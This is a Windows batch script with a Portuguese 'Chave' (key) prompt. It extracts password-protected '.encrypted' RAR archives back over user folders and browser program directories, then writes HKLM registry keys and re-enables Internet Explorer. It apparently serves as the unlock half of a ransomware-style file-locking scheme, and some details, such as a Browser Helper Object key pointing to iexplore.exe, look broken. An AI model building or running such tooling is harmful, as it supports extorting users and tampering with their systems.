@echo off

set /p password=Chave: 

Rar.exe x -p%password% -r C:\Users\%USERNAME%\%USERNAME%.encrypted C:\Users\%USERNAME%\*
Rar.exe x -p%password% -r C:\Users\%USERNAME%\%USERNAME%.encrypted C:\Users\*
Rar.exe x -p%password% -r C:\Users\%USERNAME%\chrome.encrypted "C:\Program Files\Google\Application\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\firefox.encrypted "C:\Program Files\Mozilla Firefox\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\%USERNAME%.encrypted "C:\Program Files\Common Files\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\iexplorer64.encrypted "C:\Program Files\Internet Explorer\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\%USERNAME%.encrypted "C:\Program Files (x86)\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\chrome.encrypted "C:\Program Files (x86)\Google\Application\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\%USERNAME%.encrypted "C:\Program Files (x86)\Common Files\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\iexplorer.encrypted "C:\Program Files (x86)\Internet Explorer\*"
Rar.exe x -p%password% -r C:\Users\%USERNAME%\firefox.encrypted "C:\Program Files (x86)\Mozilla Firefox\*"

IF %ERRORLEVEL% == 0 (

     reg add "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}" /v IsInstalled /t REG_DWORD /d 1 /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\IEXPLORE.EXE" /v "" /t REG_SZ /d "C:\Program Files\Internet Explorer\iexplore.exe" /f
     reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\{89820200-ECBD-11cf-8B85-00AA005B4340}" /v "" /t REG_SZ /d "C:\Program Files\Internet Explorer\iexplore.exe" /f

     dism /online /enable-feature /featurename:Internet-Explorer-Optional /norestart
     dism /online /enable-feature /featurename:Internet-Explorer-Optional-x86 /norestart
     dism /online /enable-feature /featurename:Internet-Explorer-Optional-amd64 /norestart
     wmic path win32_ie set enabled=true

)